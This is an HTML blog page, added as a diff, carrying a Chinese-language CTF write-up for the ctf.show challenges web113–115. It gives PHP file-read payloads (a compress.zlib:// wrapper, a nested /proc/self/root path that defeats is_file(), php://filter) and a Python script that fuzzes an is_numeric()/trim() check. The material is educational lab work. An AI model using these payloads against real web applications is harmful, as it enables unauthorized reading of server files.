@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web113开启容器 代码审计  换zip、bzip、zlib试试 1&#x2F;?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php   同时is_file() 目录溢出漏洞, 大概意思就是通过多级嵌套绕过检测 这里的 &#x2F;proc&#x2F;self&#x2F;root 是一个指向 &#x2F; 的软连接 12345&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web113-115">
+<meta property="og:url" content="https://youngking-gfy.github.io/2025/03/18/web113-115/index.html">
+<meta property="og:site_name" content="Youngking&#39;s Blog">
+<meta property="og:description" content="web113开启容器 代码审计  换zip、bzip、zlib试试 1&#x2F;?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php   同时is_file() 目录溢出漏洞, 大概意思就是通过多级嵌套绕过检测 这里的 &#x2F;proc&#x2F;self&#x2F;root 是一个指向 &#x2F; 的软连接 12345&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/18/web113-115/file-20250318143429011.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/18/web113-115/file-20250318143714454.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/18/web113-115/file-20250318143732340.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/18/web113-115/file-20250318143819134.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/18/web113-115/file-20250318144054728.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/18/web113-115/file-20250318144145973.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/18/web113-115/file-20250318145130745.png">
+<meta property="og:image" content="https://youngking-gfy.github.io/2025/03/18/web113-115/file-20250318145016650.png">
+<meta property="article:published_time" content="2025-03-18T06:32:26.000Z">
+<meta property="article:modified_time" content="2025-03-18T06:52:17.086Z">
+<meta property="article:author" content="Y0ungK1ng">
+<meta property="article:tag" content="php特性">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://youngking-gfy.github.io/2025/03/18/web113-115/file-20250318143429011.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>web113-115</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/03/18/web116-117/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/03/18/web105-112/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/03/18/web113-115/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&text=web113-115"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&title=web113-115"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&is_video=false&description=web113-115"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web113-115&body=Check out this article: https://youngking-gfy.github.io/2025/03/18/web113-115/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&title=web113-115"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&title=web113-115"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&title=web113-115"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&title=web113-115"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&name=web113-115&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/03/18/web113-115/&t=web113-115"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web113"><span class="toc-number">1.</span> <span class="toc-text">web113</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web114"><span class="toc-number">2.</span> <span class="toc-text">web114</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web115"><span class="toc-number">3.</span> <span class="toc-text">web115</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        web113-115
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Y0ungK1ng</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-03-18T06:32:26.000Z" class="dt-published" itemprop="datePublished">2025-03-18</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AE%89%E5%85%A8/">渗透安全</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/php%E7%89%B9%E6%80%A7/" rel="tag">php特性</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/18/web113-115/file-20250318143429011.png"></p>
+<p>换zip、bzip、zlib试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/18/web113-115/file-20250318143714454.png"></p>
+<p>同时<br><code>is_file()</code> 目录溢出漏洞, 大概意思就是通过多级嵌套绕过检测</p>
+<p>这里的 <code>/proc/self/root</code> 是一个指向 <code>/</code> 的软连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p</span><br><span class="line">roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro</span><br><span class="line">c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/</span><br><span class="line">self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se</span><br><span class="line">lf/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/18/web113-115/file-20250318143732340.png"></p>
+<h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/18/web113-115/file-20250318143819134.png"></p>
+<p>直接filter就可以</p>
+<p><code>/?file=php://filter/resource=flag.php</code></p>
+<p><img src="/2025/03/18/web113-115/file-20250318144054728.png"></p>
+<h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/18/web113-115/file-20250318144145973.png"></p>
+<ul>
+<li><code>$num</code>必须是一个数值或数值字符串。<ul>
+<li><code>is_numeric()</code> 的相关比较可以看到我们在数字开头加入一些特殊字符可以绕过 <code>is_numeric()</code> 返回 true</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27; 36&#x27;</span>); <span class="comment">// true</span></span><br><span class="line">	<span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;36 &#x27;</span>); <span class="comment">// false</span></span><br><span class="line">	<span class="title function_ invoke__">is_numeric</span>(<span class="string">&#x27;3 6&#x27;</span>); <span class="comment">// false</span></span><br><span class="line">	</span><br><span class="line">	<span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;\n36&quot;</span>); <span class="comment">// true</span></span><br><span class="line">	<span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;\t36&quot;</span>); <span class="comment">// true</span></span><br><span class="line">	</span><br><span class="line">	<span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;36\n&quot;</span>); <span class="comment">// false</span></span><br><span class="line">	<span class="title function_ invoke__">is_numeric</span>(<span class="string">&quot;36\t&quot;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>$num</code>本身不等于<code>&#39;36&#39;</code>。<ul>
+<li>而源码中的 <code>!==</code> 和 <code>===</code> 一样是强类型比较，对于 <code>===</code> 的强类型比较, 但凡比较的字符串有一点点的不一样 (空格 tab 换行符等), 就返回 false</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; 36&#x27;</span>==<span class="string">&#x27;36&#x27;</span>; <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;36 &#x27;</span>==<span class="string">&#x27;36&#x27;</span>; <span class="comment">// false</span></span><br><span class="line"><span class="string">&#x27;3 6&#x27;</span>==<span class="string">&#x27;36&#x27;</span>; <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\n36&quot;</span>==<span class="string">&quot;36&quot;</span>; <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;\t36&quot;</span>==<span class="string">&quot;36&quot;</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;36\n&quot;</span>==<span class="string">&quot;36&quot;</span>; <span class="comment">// false</span></span><br><span class="line"><span class="string">&quot;36\t&quot;</span>==<span class="string">&quot;36&quot;</span>; <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; 36&quot;</span> === <span class="string">&quot;36&quot;</span> <span class="comment">// false</span></span><br><span class="line"><span class="string">&quot;36 &quot;</span> === <span class="string">&quot;36&quot;</span> <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;\n36&quot;</span>===<span class="string">&quot;36&quot;</span>; <span class="comment">// false</span></span><br><span class="line"><span class="string">&quot;\t36&quot;</span>===<span class="string">&quot;36&quot;</span>; <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>去除<code>$num</code>两端的空白字符后不等于<code>&#39;36&#39;</code>。<ul>
+<li>我们需要找到一个不能够被 <code>trim()</code> 去除的字符</li>
+</ul>
+</li>
+<li>经过<code>filter()</code>处理后的结果等于<code>&#39;36&#39;</code>。</li>
+</ul>
+<p>可以fuzz下ASCII 0-31 字符</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://597242c4-7a96-4a3b-adff-63333fbbf7b9.challenge.ctf.show/?num=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="number">16</span>:</span><br><span class="line">        s = <span class="string">&#x27;0&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(i).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="built_in">str</span>(<span class="built_in">hex</span>(i).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    payload = <span class="string">&#x27;%&#x27;</span> + s + <span class="string">&#x27;36&#x27;</span></span><br><span class="line">    res = requests.get(url + unquote(payload))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/18/web113-115/file-20250318145130745.png"><br>最终的 payload 是 <code>%0c36</code>, 即 <code>\f36</code>, 其中 <code>\f</code> 是换页符</p>
+<p><img src="/2025/03/18/web113-115/file-20250318145016650.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web113"><span class="toc-number">1.</span> <span class="toc-text">web113</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web114"><span class="toc-number">2.</span> <span class="toc-text">web114</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web115"><span class="toc-number">3.</span> <span class="toc-text">web115</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/03/18/web113-115/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&text=web113-115"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&title=web113-115"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&is_video=false&description=web113-115"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web113-115&body=Check out this article: https://youngking-gfy.github.io/2025/03/18/web113-115/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&title=web113-115"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&title=web113-115"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&title=web113-115"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&title=web113-115"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/03/18/web113-115/&name=web113-115&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/03/18/web113-115/&t=web113-115"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Y0ungK1ng
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
